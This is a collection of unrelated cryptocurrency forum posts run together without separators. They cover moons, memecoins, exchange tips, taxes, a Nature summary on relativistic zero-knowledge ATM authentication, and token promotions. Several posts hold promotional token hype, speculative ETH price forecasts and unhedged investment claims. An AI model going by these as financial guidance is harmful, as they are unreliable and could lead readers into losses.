There has been a brand new GME x Loopring code leak. [File](https://etherscan.io/address/0xb170dd1352b9928bd1dd1f11d25f5a1d617baeb2#code) 3/17, row 110. 

&amp;#x200B;

The part we are looking at says the following: 

"*Delegate authorization to a different contract (can be called by an owner to "eject" from the GameStop ecosystem.)*"

&amp;#x200B;

But what does this mean? 

It seems like the code will be used by people who want to move their NFTs off of GameStop's platform. Most likely means that you will be able to move, sell or transfer your GameStop NFTs as you see fit. 

&amp;#x200B;

What is this contract used for you may ask?

We can only speculate right now, but it seems like GME most likely contracted Loopring to build their NFT marketplace. I'd imagine it will be GameStop specific, seperate from Loopring's market, but the entire project will be hosted/operated/maintained by Loopring.

&amp;#x200B;

If this won't give the Loopring holders hope I don't know what will. I think we are still early. What do you think about all of this?

So, you might have seen my post a few days ago about how i got around 200 moons which is more than my weekly salary and how i was gonna take a two day rest well i have changed my mind and figure that i could scrap by this month so, i wanted to swap my moons to invest in some other crypto so, guys can you please recommend me what crypto should i look into? 

 I figure that it would be better to swap moons and invest in other crypto than spend them on my needs cause i feel  like in the future it would be a much better help for me in the future

There's still a few floating around, and astonishingly SQUID seems to have gained significantly today. I don't understand how people can be that stupid, but there you go. 

SHIB, the driving factor of the memecoin run has dropped from 9th to 11th in marketcap, and is down more than 30% from its all time high. It is showing a downward trend while real projects like ETH, SOL, DOT and LRC are now hitting all time highs and still moving towards the upside. 

Yes, they will still be around, and DOGE isnt going anywhere, but at what point, can we say this meme crap is finally over? I'd like to try hold on to the new retail investors and help direct them to coins with actual futures. I'm tired of reading FUD, scams and stories about aunts loosing their life savings.

The crypto market has grown at an incredible pace over the last 5 years. 
 
What seemingly insignificant daily activity could you have done in the past to have made unthinkable gains now? 

An example is if you or anyone you know drinks soda or beer, simply recycling cans in the 2015-2016 period and putting it into ETH would have given you a very significant ETH bag. 

Living in a college town over that period, if I had collected cans even one day a week for a year I would be living on a Lambo island right now.

What small thing could you have down in the past to make your current self crypto rich?

Yes Im late to the party, but just started learning about the metaverse.

With the hype around Facebook jumping into the scene I just recently caught wind of it all. Yes, I live under a rock.

Anyway, Facebook sucks balls, but surely we can embrace the metaverse and other companies involved. Im intrigued to learn more about it as it is a culmination of some of the best sci-fi movies coming to fruition.

Just about anything in the real world will be achievable with digital maps and objects. Top it off with equipment strapped to our bodies to simulate any type of physical sensation and many of us will never leave home again.

It may sound crazy but there will most likely be people living and working in the Metaverse the majority of their days.

What good and bad do you see this bringing to the human race?

Has anyone stumbled across a list of crypto projects involved in metaverse development? Id love to look into the ideas and companies behind them.

Thanks

Serious question. Are we entering a phase where popularity is just as valuable as use case? 

Use cases are great, but if people don't *actually* use the coin yet, can we be sure they will in the future? What if a coin with the same features but better marketing comes along? If there are two identical coins, effectively, but one is called Cryptocoin and the other is called FluffyKitty, it's kind of a no brainer people would want to hold one over the other.

I guess I'm just trying to point out that how much people care has such a huge impact on price its not to be discounted. Obviously if a coin is useless and it pumps that's probably not something most of us want to be a part of. But even cool coins with great use cases I am reluctant to buy into because I'm just wondering if anybody will actually buy into the actual use case. Too many cool inventions failed because they just couldn't market right and/or catch on. 

Maybe a terrible example, but for some reason my mind goes to that old game P-O-X that never caught on. They actually had good marketing and a dope idea, create aliens and battle wirelessly from a 30 ft distance back when wireless gaming wasn't a thing yet. I remember seeing that as a kid and thinking it was next level and going to be the coolest thing ever. But it never caught on. According to Wiki it was because it came out in 2001 and then 9/11 and anthrax happened and Toys R Us and focus groups didn't like it so it got pulled from the market. But, to be honest, I think the public wasn't really ready anyways.

Weird example I know, but how many coins will we see with cool tech that fizzles and burns out before people are ready, only to be replaced by another coin that does it better and has better timing?

I am very new to cryptocurrency and kind of out of the loop when it comes to video games. (The only game I regularly play is Elder Scrolls Oblivion.) 

I am looking into coins to invest in and there seems to be a lot of hype around Loopring, GameStop and NFTs but I am struggling to understand how they might be connected.

I know this is al hypothesis at this point but could the Loopring tokens become things you would collect within games as rewards like SuperMario coins, tokens used as currency within games to buy digital items like houses or cars, a currency used by GameStop as a means to buy actual games or something else entirely?

Hi folks, crypto novice here, how would I calculate my possible profit/return %?

Im not the best with math but I would assume its something like: investment x price per coin x rise in price, if someone could help me out that would be super helpful. Learned a lot already in this sub and look forward to continuing to!

I've been flipping through the sub, articles, etc and I can't seem to find a real answer that suits my question so I figured I'd write my own. 

I've been following crypto vaguely, but no real insight on all the specifics of individual markets, but I'm looking to start. Longer term, small scale, nothing I'd be too afraid of tanking.  I'm just wondering, what platform is the best in Canada (Ontario specifically)? I know there's some concerns with security, regulation, and even the exchange rate back and forth across the border. Just wondering if you folks had any pointers, or at least a better idea of where to get Canadian specific crypto info from.

I just noticed that r/CryptoCurrency is #3 on the top growing Reddit subs today.  Combine this with Coinbase and Crypto.com being at the top of Android and IOS downloads and I think that adds to the bullishnesh of the current market ......or it definitely adds to my confirmation bias.

Just thought I'd point this out to everyone.  So, to add some more words.....thanks to all the heavy hitters here who post great content.   Thanks to all the shit posters here who do not post great content.  I think this last sentence will get me over 500 words.

Hello
I wish to understand liquidity pools and pricing a bit better. I will not mention the token I want to understand it for so it stays educational. 
But if you are good with defi please maybe msg me after posting too.

There is a token on defi that has skyrocketed recently,  and now skydived.... But the price drop seems huge for a rather tiny sell off.
From what I understand, the market price is basically the going liquidity price, which is an algorithm looking at how liquid the pot is, and as sells happen you give up more token for less liquid money. And as more buys happen you get less token for more money.

I assume also pricing stability is an equation of the token liquidity vs the cash (well, other paired currency) liquidity. 

So the reasoning I have on why the price dropped so much,  is the liquidity pool of 'cash' is very small,  meaning it doesn't take lots to quickly down the price. 

And if there is more in liquidity,  then a sell off changes the price less... but I assume also the seller gets more cash for less tokens sold.

The token which I won't say so I can't be called a fudder and so I only get education so I learn, apparently has a massive market cap like 1000x the money of the trades that dropped it, so either the market cap is not true, or, the liquidity pool is just set way too low.

Also does slippage play a factor and if how so. 
This token is on defi and not on exchange atm.


Thankyou

I just learned about Banano as a reward for folding@home and I was instantly in love with the concept. For anyone that is new (like me) you can learn about the project [here](https://foldingathome.org/start-folding/?lng=en) and get started with mining Banano [here](https://bananominer.com/). 

One of the current conundrums in science is an abundance of data, particularly in the oceans and atmospheres disciplines. Surely there is a way to leverage personal computers to aid these and other efforts. So long as the power requirements are reasonable and you can adjust the "mining" intensity, I see literally no downside. 

I know this may read a bit like that person in your family who meets a programmer for the first time and assaults them with their "best" app ideas, but it got me excited. 

I'm pretty new to all of this so does anyone know of any other projects like folding@home that reward you with coins?

Sorry everyone many people suggested I create a poll so I deleted thinking I could post a poll thread but it's not allowed. So I created a poll on polly. It allows people to add coins and vote. No registration or info needed. I added bitcoin just as a start. The top selection will be chosen. I wanted to add another rule. Because of transaction fees I want to limit this to one coin at a time. Let's have some fun shall we?

https://poll.ly/#/2kM9lRz3

As it says above I'm interested to seeing term investing with the community and I want to test it with an experiment. I have $100 in coinbase. I'm putting a timer of 24 hours. After that 24 hours I will invest that in the coin of the subs choosing. I'll leave it in for a month. The day before it ends I will post another thread asking of everyone wants to keep it in, or switch it to another coin. The only requirement is that it has to be a a coin listed on coinbase.

I will post screenshots showing the position  initially and then updated monthly.

I've had a bit of a windfall lately, and like, in this market, I'm sure a lot of people here have. Having a bit of trouble dealing with it emotionally to be honest. How do I stay level-headed, avoid bragging and becoming a bore to my friends and family? How do I maintain some equanimity so I'm not completely crushed if there's a crash and I lose all this new wealth? 

Some days I check my balance and feel absolutely giddy, it looks so good. And I haven't even earned life-changing amounts of money yet, although at this rate I'm headed there. I just know if something goes wrong I'm gonna feel fucking crushed. Need to be a bit more grounded. halp

This was published today in Nature: https://www.nature.com/articles/s41586-021-03998-y

Below I've pasted the New and Views summary from Nature:

**Relativity could ensure security for cash machines**

When you type in your personal identification number (PIN) at a cash machine, you feel safe  provided you cover the keypad with your hand. But even the machines attached to banks are vulnerable to attack by fraudsters, some of whom go as far as to add fake machinery to legitimate machines as a way of stealing PINs (see go.nature.com/3p9r431). To prevent this type of fraud, a solution is needed that allows people to prove their identity without disclosing any secret information. Writing in Nature, Alikhani et al.1 describe an experiment that achieves this goal with unprecedented security, guaranteed by Albert Einsteins special theory of relativity.

The identification technique used by Alikhani and colleagues is an application of a concept known as a zero-knowledge proof2. Imagine that Alice wants to convince her friend Bob that she knows how to do something, but she wants to keep her technique secret. For example, suppose she is capable of distinguishing between two brands of cola in a glass simply by looking at them. She asks a sceptical Bob to switch around identical glasses containing the two types of cola while her back is turned. If she can still tell the drinks apart, and can repeat this feat several times, Bob will be convinced of her ability  but he wont have learnt how to do it himself. Alice has performed a zero-knowledge proof.

If Alices trick relies on secret knowledge that is unique to her, then being able to do this task correctly functions like a cash-machine PIN for Alices identity. Alice proves that she has information known only to her, but she doesnt share this information. So even if the cash machine is equipped with fake machinery, the person who installed it cannot later use what was learnt to impersonate Alice.

Remarkably, there is a zero-knowledge proof for any mathematical statement for which a conventional proof exists3  and there are highly efficient schemes for applying zero-knowledge proofs to the task of establishing someones identity4. However, implementing a general zero-knowledge proof involves encoding the answers with an entirely different mathematical problem, such as factoring a large number. This means that the alleged security of most conventional zero-knowledge proofs3,4 depends on how difficult this other mathematical problem is to solve. Unfortunately, once quantum computers are readily available, it will become possible to solve many of these other problems in a period of time that is sufficiently short to defeat the validity of the zero-knowledge proof5.

To make a zero-knowledge proof unconditionally secure, Alice would need to prove her identity using two separate devices that cannot communicate with each other for the duration of her interaction with the bank6. This is similar to a detective interrogating two suspects in different rooms to determine the consistency of their joint alibi. Ideally, the two devices, provided by the bank, would require Alice to supply biometric information to activate them. They would be inserted into a pair of slots on the cash machine and perform zero-knowledge proofs on her behalf (Fig. 1). Because each of Alices devices is kept ignorant of the questions asked of the other device, their answers will sometimes be inconsistent if they do not possess the secret they claim to have  that is, if they are fraudulent. But how can we be certain that the two devices cannot communicate with each other? This is where Einsteins special theory of relativity comes to the rescue.

Special relativity tells us that information cannot travel faster than light. Suppose Alices two devices are one metre apart. Any signal requires more than 3.3nanoseconds to travel between them. Therefore, if each device is required to respond within 3ns of receiving their question, and if the questions are asked within a time window of 0.3 ns, the devices will be prevented from choosing their answers on the basis of the questions put to the other device. Such exquisite precision was thought to be technologically infeasible because it seemed to imply that an enormous amount of data would need to be communicated in this short time frame. However, a much more economical scheme7 was proposed in 2020, which brings us to the work featured in Alikhani and co-workers study.

The authors describe two implementations of a simplified version of the economical scheme proposed last year. In one experiment, the devices were placed at either end of a building at the University of Geneva in Switzerland and were separated by 60metres  a distance that light takes 200nanoseconds to travel. This is clearly an unreasonable distance to use in the cash-machine scenario, because it would require Alices devices to be 60metres apart. However, the authors argue that improvements within the reach of current technology would allow them to reduce this distance to only one metre. It is therefore possible to imagine Alice sliding her biometrically activated smart cards into two slots of the cash machine. It still might not be the most practical solution, but it is on the right track.

In addition to offering a promising approach to the conundrum of a secure cash machine, the work by Alikhani and colleagues succeeds in demonstrating a feasible relativistic zero-knowledge proof of a non-trivial mathematical statement. However, there are two theoretical caveats. First, the puzzle that Alice would be using to prove her identity could be solved by a malicious party that has sufficient computing power. And second, it might become possible for fraudsters to defeat the identification scheme by harnessing quantum entanglement8, the mysterious property of quantum states that Einstein referred to as spooky action at a distance. Although special relativity prevents the two devices from communicating quickly enough to fool a cash machine into mistaking them for Alices devices, entanglement might allow the right correlations to appear instantaneously between the cheating devices with no need to know the puzzles solution9.

It remains to be seen whether this could compromise the identification process10. More-complicated schemes could defeat all possible quantum attacks7,11, but they are currently beyond the reach of practical implementation. Further work is needed  both theoretical and technological  before these ideas can find their way to your local bank.

**Crypter** token just hit their high of **57 million** market cap. You guys think that is a good pace? Just over two weeks. Seems like they are doing a good job **communicating** and **growing** the project. The **social media** platform continues to improve in my opinion. They have been hitting the press releases pretty hard too with Luna marketing. Hitting **12k holders** today, probably as I type this. Also, the android app released in the store officially yesterday I believe. One of the complaints I do see from some are that the team has not doxxed themselves well enough. In response people state they were KYC'd  through pinksale and certik.

Would love to hear opinions on a crypto social media platform. Think it is something needed with the likes of reddit and telegram?

I recently started investing in crypto of all kinds with Coinbase. I never understood that each coin is its own unique business with its own goals for the landscape of decentralization of finance.

And also something even more amazing I have realized is that each of these coins are working towards decentralization of everything.

Cool!

The reason I made this post is because I have seen some crazy volatility. Ill be up a couple hundred bucks one minute and down the same amount within a relatively small time frame.

What are some of your strategies for riding the waves successfully?

Everyone here know that crypto is the future. Nothing wrong with making money along the way!

Cheers.

As someone who is a crypto investor and is looking to at some point move out of his parents basement (crazy, I know), what is the best way to transition into some form of real estate to live in? I am worried about the opportunity cost of going balls deep into a housing project and don't want home ownership to hold me back from successfully managing my investments. I am in no rush from my parents or friends to move out, and could see myself living here for another 1-2 years if needed.

Is renting a good idea during this period of my life? Anyone have any other advice?

Honest question, the market cap will hugely prevent this but on the previous bull run I thought that the price will not go any higher since the cap was pretty crazy already. Opinions?

Hey guys, Im pretty new to this Reddit. In fact I never really use Reddit at all but figured I need education and exposure to more ideas so here I am. 

Anyway, basically I managed to get in on the doge craze earlier. My first ever real crypto investment on a brand new robinhood account. I noticed this funny crypto called doge was starting to rise so I put 500 bucks in and it turned into 7000. Sometime later I got into amc at 14 bucks and made another 5000. Finally I got into shib and made another 5000. Pretty good right? Well I made some bad stock choices along the way and that mini crypto crash cleaned me out a good 9k all things considered. So Im sitting here with about 7k all things told. I think statistically Im doing well lol. 

But Ive been in retail for a good 20 years now. I absolutely hate it, and I cant stomach moving up the ladder. Crypto at this point I feel like is my only ticket out, and I actually enjoy it. Stocks just dont really grab me the way crypto does. 

So I guess what Im asking is, do you guys have any advice for a direction to go. Im not expecting to get a million dollars out of a 10 dollar investment, but enough gains to slowly drag myself from the miasma of retail wage slavery and maybe eventually financial freedom.

SOL is killing it lately and really lifting my pf. I'm fairly new to crypto so I'm trying to work out how /when to take some profits. 

The ideal is hodling for 12 months at least, and getting a 10x return, but, who knows. 

How long does everyone think it's going to keep running?

#What is SpookySwap? 

[SpookySwap](https://spookyswap.finance/) is an all-in-one decentralized exchange on the Fantom Opera Network. It has already established itself as a cornerstone of the Fantom ecosystem, and right now the exchange has 80+ coins and tokens listed, including stablecoins and all manner of exotic alts. SpookySwap aims to be an all-in-one one-stop shop for all your crypto needs, and the app also includes liquidity and farming, staking, bridging. Just recently (as recently as last week) they also introduced their own NFT collection, if that is your thing. On your visit visit you'll immediately notice how colorful, well-designed and user friendly the entire app is. Cute, colorful, spooky. 

#BOO - Tokenomics 

BOO is the Native token of SpookySwap. It has a total max supply of 13,666,000 (quite a bit less than Bitcoin) with a current circulating supply of around six million. The current price of approx $26 USD gives it a marketcap of around $150,000,000, which ranks it at 396th on CoinGecko. 

#Staking 

The real gem of SpookySwap is the staking system. No hyperbole, it is the best I have ever used. You stake your BOO for xBOO, which is the auto-compounding profit-sharing mechanism that rewards users for locking in their value by distributing profits from the exchanges swaps and liquidity pools. Current APR for staking BOO is approx 29%, but wait there is more... 

After staking your BOO, you can then stake your xBOO for further rewards, which are given in an alternative token or coin of your choosing. For instance, my xBOO is staked for DAI, so I get a 29% APR for my xBOO, plus a further 30% APR paid in DAI on top of that. Users can harvest their Earn Rewards any time on the cheap (thanks to the Fantom Opera Networks low fees) and reinvest them, sell them, whatever. Current Staking Reward options include DAI, WFTM, and eight other Fantom network tokens. 

#Liquduidity and Farm 

The UI for supplying liquidity is super intuitive and user friendly. You supply an equal value of two different coins or tokens, and then you receive a *potion* you can add to various liquidity pools (right now 31 avaliable). APRs range from 29-150%, with the most popular (the FTM-BOO pool) currently at 58%, with almost 100 million USD in total liquidity. 

#Why Be Bullish on BOO? 

The supply cap is tiny, SpookySwap is incredibly popular, the staking rewards are outrageously good, and the SpookySwap development team just keep on adding more and more features. SpookySwap is hugely linked to the success of the Fantom Ecosystem in general, so if you're bullish on Fantom (and I am) then don't sleep on SpookySwap.

CBA one of Australia's big 4 banks now offer crypto services to their customers which is a great move coming from a bank and for Australians looking for a more secure way to purchase and hold crypto.

"TheCommonwealth Bankwill allow its customers to buy and sell cryptocurrency through its app, in the first move of its kind by a major Australian bank.
Australias largest bank announced on Wednesday it had partnered with US-based crypto exchange Gemini and blockchain analysis firm Chainalysis to offer the service to its 6.5m CommBank app users"

First i would like to start by saying congratulations to all the newcomers like myself who have earned their first set of magical digital reddit money!! Yee yeee

Okay so this was my first moon distribution day and the feeling is pretty nice. I managed to rack up over 100 moons for my first month. Im officially a triple digit moon whale and quite surprised. To see how much i could earn for being a part of a community that I enjoy honestly has driven me to commit even more time to the community. I used to spend my time gaming and chatting on the gaming Subs. Now I put my money and time towards crypto and its honestly been very beneficial.

Will there be some real uses for moons? And not that i will at the moment, but is there a way to send moons to a wallet or sell?

Currently holding about 75000 bepro and 1500 hero totalling about 1000.

Anyone got any legitimate advice or just hold them wait on them sell them and buy some more.

What is everyone holding? 

Should I just jump into something thats a couple hours old and hope for the best??

Love you all now just trying to get to the 500 word count. Nearly there I think.

People seem to be under the impression that bear markets are just things that happen.

This simply isn't the case.

Bear markets (like 2018-2019) occur *because* masses of people like ***you*** lose faith in crypto and sell. That is what drives the price down, down, down. 

Bitcoin was going backwards in adoption and stores were removing it. It had failed as a digital currency. It was not seen as 'digital gold' yet. Ethereum was meant to be better than Bitcoin, but was completely crippled by CryptoKitties.

Things were looking bleak, and the future of crypto was uncertain.

Buying at the bottom of the 2018 bear market required an almost delusional amount of optimism. You would not have bought.

If we ever see crypto crash by 90-99% again, you probably wont buy, because you'll probably have already sold and given up, and partly be the cause of that crash.

---

With all that said...

Bear markets like the past ones required so many people to lose hope in crypto. I don't think that can happen again. As of 2020, crypto is finally being adopted and used. This time ***is*** different.

Bitcoin is now 'digital gold' and is actually being adopted as an investment/store of value/hedge against inflation. Ethereum now has DeFi and is actually scaling.

It'll be much harder to scare masses of investors out of crypto, to cause another bear market.

A project i would like to share: https://crosschainbridge.org/ which might become interesting when adopted and MC rises.

It went live last week; a bridge portal between ETH/MATIC/BSC for coins and NFTs. More chains will be added and there are multiple options for passive income when Farming/ Staking liquidity and Reward Pools. Germany based team from TIXL.
As with the other projects i share here: yes, i have invested and i think it has potential.

We are currently witnessing a biggest Bull Run in Crypto world. This is a reminder, just because your reddit communities are asking you to hodl, doesnt mean you have to. You need make that decision by yourself. 

I would say, if you dont need the money for next few years and you are getting paid well on your job or business, then do not sell. 


But When you enter into the crypto market, it is also important to understand when to exit the market. Its not necessary that you must exit the market. But it is very important to know when is the right time to do that. 



 Know your Goals

Examples - 

*To make 10% Profit

*To double your holdings

*Hold long term(5-10 years)



 1st Strategy - Sell at price targets

Set up some price targets by doing market research. And divide your investment selling targets between higher lows and higher highs.

For example,  if you own 1 bitcoin. Divide it in 5 parts. 
If your price target is 110k. Sell 0.20 btc each at 90k, 100k, 110k, 120k and 130k.


 2nd Strategy - Dollar cost average out

Same way people DCA their way in. You can also DCA out. 
Spread your sells according to your price targets. You can divide your investment in 10 parts, and sell some every day, week or every month.
This way you will sell everything in 10 days, weeks or months. Without fear of losing anymore profits. 


 3rd Strategy - Exit by Return %

When you buy a crypto, you should have a general idea about when you are going to sell it. 
For example, if you bought ADA at $1, you might have decided to sell it at $3 or $5 or $10 or even $100. 
Always fix these prices targets to exit by return. 

Write these targets down and stick to it.
If you have made enough amount of return, enjoy that money and use it while you are still alive. Do not believe in fomo posts talking about how Btc will rich 100 million one day. You wont be alive to see that day. 
Make sure you spend everything you have earned on yourself, not your grandchildren.


 4th - Exiting by Cycle

You can research about bull cycles. And sell your holdings at the top of every cycle.
Same way you can buy back in at the bottom of the cycle.


 5th - Exiting based on your goals.

When we get into crypto, first thing we do is open the calculator app, and calculate how much money we are going to make with crypto. And how much money is enough to retire on. 
Some people dream about lambo, some dream about a new house, and some want retire from working, just using their crypto investments.

When your portfolio reaches that amount which is necessary for your goals, Exit the market. And use that money for your goals. 
This strategy doesnt work well for everyone, but it does help complete the goals you set. 


To conclude,
Do your own research. And be happy with the money you have made. 
Thank you for reading this.

Yes, I know there are other questions like this out there, and yes, nobody here is a tax attorney or accountant, and so on. 

I understand that converting from Coin A to Coin B counts as a "taxable event". 

NOWHERE can I find an answer as to what % of what amount you are supposed to actually pay taxes on. 

Let's say you convert $100 worth of Coin A to Coin B. 

The fiat value of Coin B is still $100.  

Your net change in fiat value is $0. 

How much tax is owed on that "taxable event" of that specific conversion???

Got shib from [crypto.com](https://crypto.com)

tbh just tired of the memecoin and want to cash out, I have the coins in my external wallet accessible through coinbase wallet and defi wallet through [crypto.com](https://crypto.com). I want to just cash out and be done with it or at the very least put it into a legitimate crypto. Every thing I try requires mining fees that are almost 3 to 4 times the amount that I possess. Is there a way to just get USD for this without astronomical gas fees? I don't need the money in a dire way, just moreso done with the whole thing and could use the money for christmas/life stuff.

Robert predicts that this bull run will really start heating up soon. I believe Robert, my cabby the other day said that he was thinking about getting into crypto. Robert said that "we will see a 120k BTC and a 10k ETH minimum". He also said that "then things will enter the mania phase". Shitcoins with literally no purpose will start pumping thousands of percents all day long. We have already seen Squid get rug pulled. This can only be a warning sign of the madness to come!

Looking at It from outside the box were the reason why Crypto isnt yet widely adopted and useful. Our Human greed and short vision is behind its slow down. Years from now when the human brain evolves they will laugh hard at our behavior today. Why is that? Because were collectively deciding to bring the Crypto to an unnecessary and completely avoidable bear market. We all have targets to sell at so we can buy cheaper while if we all Hodl we can encourage wide adoption and a safe environment for newbies to join us. By doing so w would all profits even more. But forget about it because we are still too far from reaching that mentality. We might get old before seeing the power of crypto unleashed and its us the reason why. Thank you.

This honestly makes me sort of sick.

https://twitter.com/GooseOfCrypto/status/1456002541808807938?t=4CwMQlMeeiP0vPTBG9B7uw&amp;s=19

I feel like crypto has gone so far off the deep end when it comes down to integrity, banking the unbanked and getting away from wallstreet.

Now we have actual VCs who hold most of the supply laughing about their gains in such a tone deaf attitude. 

All for a centralized coin that was shut off only a few months ago. Curious on peoples take here because after seeing just how little people seem to care about the original intention of the tech and seeing VCs in crypto idiolized its making me lose hope in this industry long term.

Is this really what Satoshi wanted?

Dog memes getting smoked last couple days. 

Is this a consolidation and gonna pump or is the hype over? 

I missed the Shib craze. 

Picked up Dogelon Mars a few weeks ago. Still up and gonna hold just incase. There was some chatter in it this last week. 

Not really worried about it either way. Just figured try riding a pump. Clearly money to be made with hype and well marketed tokens.  Maybe  attention will start moving into legit projects like my Fav CKB. 

Is the shit show over? Or is gonna pump again?

Title says it all. I have been trying to figure out how to buy LOOP following this guide here. Absolute cryptocurrency noob. I have literally never bought crypto before today.   


[https://www.loop.markets/how-to-buy-loop-loopr-beginner-friendly/](https://www.loop.markets/how-to-buy-loop-loopr-beginner-friendly/)  


Got to step 2 (Buy Terra LUNA on kucoin) but apparently its not available for US residents. So I tried kraken, nope not available to WA state residents. So I went to Coinbase, great.   


Bought USDT. Then went to figure out how to send it to my Terra station wallet, nope apparently not able to do that.. for reasons I don't understand.  


OK. Pretty frustrated at this point. Can anyone help me out here?   


Is there a different exchange I can send the USDT to, and then transfer it to my terra station wallet from there? That works for USA, WA state residents?

With all the crypto scams and thefts going on, I am wondering if there has been any development to protect people in some decentralized manner.

One way I can think of is having a decentralized register that people can vote for black-listing a coin address (similar to Bitcoinabuse.com). For example, in the event of a theft a person could come to Reddit to explain their case. Based on their past post history and standing, people could opt to help freeze the coins through voting. DEXs could then use this information to hold these coins in escrow if they ever show up. 

As part of the register, the onus would be on the account holder to prove to an established set of arbiters that they have legal right to the coins. Anyone can be an arbiter but they would need some sort of social standing. Of course, there would need to be appropriate checks and measures such as un-freezing the coins if the arbiters were themselves subject to votes of distrust.

Does anyone know if such a system exists or in development? I can see there are lots of efforts to black-list coins but mistseen like a very centralized and non-automated processes.

Everyone talks about Coinbase Pro, but I never see Gemini mentioned here.  I'm not affiliated with them in any way, but Gemini has become my preferred method for turning that dirty fiat into sweet sweet crypto.  Since Gemini gives you 10 free transfers a month, you can send your crypto to any exchange, or DCA small amounts into your cold wallet without getting ravaged with transfer fees.

**TL;DR - Buy crypto on Gemini, and then send to any wallet for zero transaction fees (10x/month).  Gemini has low trading fees (0.10\~0.35%), but you must select Gemini ActiveTrader.**

&amp;#x200B;

***PROS:***

\+++ **10 free transfers every month**.  Seriously you could buy $1 of ETH, send it to your cold wallet, and still pay zero transfer fees.  This is the biggest advantage of Gemini, and the primary reason why I ditched Coinbase. 

\+ Relatively low fees (but you must select ActiveTrader in your settings! See below).  Fees for most traders are **0.10%** (maker) to **0.35%** (taker).  

\+ Instantly transfer money from your bank to buy crypto.  No fees.  Your bank gets linked via Plaid.

\+ Available in most US states and 60+ countries. Check availability here: [https://www.gemini.com/areas-of-availability](https://www.gemini.com/areas-of-availability)

&amp;#x200B;

***CONS:***

\- Must use select the ActiveTrader interface in your settings (see below), or else you will get hit with high trading fees.  Similar to Coinbase vs Coinbase Pro.  Fees for the normal Gemini are 1.5% for buys over $200 or a fixed fee under of up to $3 for anything less. DON'T do this.

\- No "pro" mobile app equivalent.  There is a standard Gemini app, but it has the high trading fees.  You can still make wallet transfers for free.  I only use the mobile app for checking balances or sending money to another exchange/wallet.  (*Workaround*: use your phone's web browser to access the Gemini desktop site)

\- Newly transferred funds from your bank account can't be transferred for a few days.  *Workaround*: Keep a small amount of crypto/fiat on Gemini to prevent the hold. Example: Leave $100 of BTC on your Gemini Wallet.  Then you can buy $100 of ETH and immediately move that ETH to another wallet without waiting. 

\- May not have your crypto of choice.  I just buy BTC and send it my exchange of choice. 

&amp;#x200B;

**How to get the low fees with ActiveTrader?**  It's simple. Goo to account settings and scroll down to Trading Interface. Select ActiveTrader.  This gives you a more advanced trading interface and gives you the lowest fees.  There is no cost for this.  Think of it as Coinbase Pro without needing a separate app/website.

You probably would've heard what's going on in the Crypto market in terms of price reaching ATH and then Slipping back to 58K again to reach and close above 60K monthly for the first time. But there's something more than that happening...

Bitcoin ETF has increased the exposure for the institution money to enter into the Crypto market which obviously is for BTC

With the recent introduction of Meta verse , many crypto currency are benefiting from this especially the gaming community are growing in a rapid pace 

Microsoft also enters into the race to build their own meta verse inside their teams for a mixed reality

CBA in Australia becomes the first to offer crypto currency trading to its users 

Churches have started to adopt crypto as a mode of digital currency for Donations namely the  Mississippi Baptist church first southern Baptist Church to do so 

University have started to accept payment in Crypto currencies namely Bitcoin

Lastly the number of wallets in the blockchain has crossed a whopping 22million in the last year 

These are some of the major adoptions seen in the open world and there are places every where which is developing with the help Crypto and BTC. What do you guys think about this? Are we really in the adoption stage or still early in the Crypto as a currency mode

Hello everyone,

I'm a friendly smart guy from a poor country, with little to no knowledge about cryptocurrencies, but I'm learning fast.

A few days ago, my entire fortune was 85$, which is a big sum in my country due to bad currency.

I threw 75$ on sand coin at 0.7$ then sold for 219 USDT

Now I randomly bought this thing called SOL because it seems really cool, but I'm lost and don't know what to do.

Current fortune (all on Binance.com):

\-  0.89910000 SOL  $221.08  

\-  5.12580775 ADA  $10.51 

\-  1.17816670 USDT  $1.18    

What do I do from here please

Really! While the community is busy evaluating transactions per second, why arent we evaluating decentralisation metrics?

So. What is actually the most decentralised Altcoin? And please, include some information in your response to demonstrate how you arrived to this conclusion.

Please dont say ETH 2.0! I get it, but its not in the market today, then it doesnt have a seat on this table. Just how Cardano doesnt have a seat on the dapps table (yet).


Transactions per second is a terrible metric if its not accompanied with a measure of decentralisation.

I was trying to get a little money on coinmetro to buy some VXV. I was planning on getting some USDC on Binance and send it to CoinMetro but I saw this message when trying to deposit.

Important
If you're depositing from an exchange, please make sure they support sending funds to ETH contracts, or use a full ETH wallet as intermediary.

I am used to send money between Binance and Kucoin by selecting TRC20 so I don't get charged huge fees.

CoinMetro basically gives me just one address without any identification and shows me that message above. What should I do? Is that a ERC20 address? Will I get choked on fees if I send the money that way? Any advice?

Woke up today to see that we moons have been distributed. I am very happy to see that I have recieved moons in double digits. A first for me. I have always been introverted, however, the allure of moons have made me comment on this sub recently. O e possible use that I know of Moons is that they can be [swapped for Nano](https://moon.nano.trade/)

I would appreciate if anyone could share further use cases of Moons. Are they just r/cryptocurrency's way of maintaining score of do they have more real world use? Is there an exchange when you can trade them? Is there any point in hodling them?

Right now ETH is worth ***$4600***, and over the past year, Ethereum has been one of the biggest winners in the cryptocurrency world. 

It powers many of the key functions that make the blockchain useful,  underpinning all sorts of smart contracts. Everything from decentralized finance (DeFi) to non-fungible tokens (NFTs) arguably wouldnt be possible without Ethereums existence. 

&amp;#x200B;

#                        Here are some of ETH predictions:

&amp;#x200B;

*  **WalletInvestor** predicts ETH could hit $6,918 in one year and ***$17,465*** in five years.

&amp;#x200B;

*  **CoinPriceForecast** puts forward a 2021, 2023, and 2026 price target of ***$6,921***, ***$11,088*** and ***$19,110***, respectively for ETH. 

&amp;#x200B;

*  **LongForecast** provides a 1-year and 3-year price forecast of ***$14,103*** and ***$20,394***, respectively for ETH 

&amp;#x200B;

*  **Gov.Capital** provides a 1-year and 5-year forecast of ***$5,713*** and ***$15,368*** for Ethereum. 

&amp;#x200B;

* **Telegaon** provides a 1-year and 5-year forecast of ***$30,216*** and ***$88,776*** for Ethereum. 

&amp;#x200B;

* **Avarage** r/CryptoCurrency redditor provides a 1-year and 5-year forecast of ***$150,000*** and ***$500,000*** for Ethereum.

Hey,
I got into crypto at the beginning of this year.
Today I looked into crypto lending for the first time.

In my example: 
I borrow 1000 usdc with a collateral of 2000$ worth of btc and an APR of 8%. 

I can stake usdc for at least 10%.

I don't intend to sell any bitcoin in the next years and I have faith in bitcoin not to drop significantly in the upcoming months. For me that sounds like a no brainer. 

But is it really that simple or am I just not seeing the Elefant in the room?

Sry if this was asked before and for my lack of knowledge

Good morning fellow Crypto Holders,  
On the auspicious day of Diwali and more specifically Lakshmi Pujan, I wish everyone a happy and healthy Diwali!

Today is one auspicious day for buying investment tools to increase your wealth and to increase your happiness. Start your amazing day with some sweets and I hope your year goes amazingly well!

